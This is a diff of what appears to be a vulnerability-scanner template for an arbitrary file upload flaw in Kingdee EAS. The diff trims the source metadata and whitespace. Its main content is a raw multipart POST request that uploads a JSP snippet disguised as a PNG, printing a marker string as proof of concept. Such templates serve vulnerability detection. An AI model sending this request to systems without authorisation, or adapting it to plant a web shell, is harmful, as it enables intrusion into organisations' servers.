@@ -3,12 +3,8 @@ info:
   name: 金蝶 EAS与EAS Cloud任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/to9dt0qafvl2wmsi'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: to9dt0qafvl2wmsi
-    fofa: app="Kingdee-EAS"
 http:
 - raw:
   - 'POST /plt_portal/setting/uploadLogo.action HTTP/1.1
@@ -26,14 +22,10 @@ http:
     Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
 
 
-
-
     --04844569c7ca7d21a3ca115dca477d62
 
 
     Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
-
-
 
 
     ab
@@ -45,8 +37,6 @@ http:
     Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
 
 
-
-
     ac
 
 
@@ -56,16 +46,10 @@ http:
     Content-Disposition: form-data; name="insId"; filename="insId"
 
 
-
-
-
-
     --04844569c7ca7d21a3ca115dca477d62
 
 
     Content-Disposition: form-data; name="type"; filename="type"
-
-
 
 
     ad
@@ -78,8 +62,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <%out.print("dudesite");%>
